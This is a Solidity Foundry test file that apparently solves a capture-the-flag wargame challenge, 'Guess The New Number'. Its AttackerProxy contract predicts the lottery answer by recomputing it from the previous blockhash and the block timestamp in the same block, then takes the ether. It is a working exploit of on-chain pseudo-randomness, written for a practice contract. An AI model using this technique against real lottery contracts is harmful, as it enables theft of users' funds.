// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/lotteries/GuessTheNewNumberChallenge.sol";

contract AttackerProxy {
    GuessTheNewNumberChallenge public target;
    constructor(GuessTheNewNumberChallenge _target) {
        target = _target;
    }
    function attack() external payable {
        // compute the answer in same block
        target.guess{value: msg.value}(uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))));
        payable(msg.sender).transfer(address(this).balance);
    }

    // receive ether
    receive() external payable {}
}

contract GuessTheNewNumberChallengeTest is Test {
    GuessTheNewNumberChallenge public challenge;
    AttackerProxy public attacker;
    address testAccount;

    function setUp() public {
        testAccount = vm.addr(1);
        vm.deal(testAccount, 10 ether);
        vm.startPrank(testAccount);

        challenge = new GuessTheNewNumberChallenge{value: 1 ether}();
        // simulate new blocks
        vm.roll(block.number + 1);
        // prepare the proxy contract
        attacker = new AttackerProxy(challenge);
    }

    function testGuess() public {
        // we can use proxy contract to attack
        // it can compute the answer in same block
        attacker.attack{value: 1 ether}();
        assertTrue(challenge.isComplete());
        assertEq(testAccount.balance, 10 ether);
    }
}
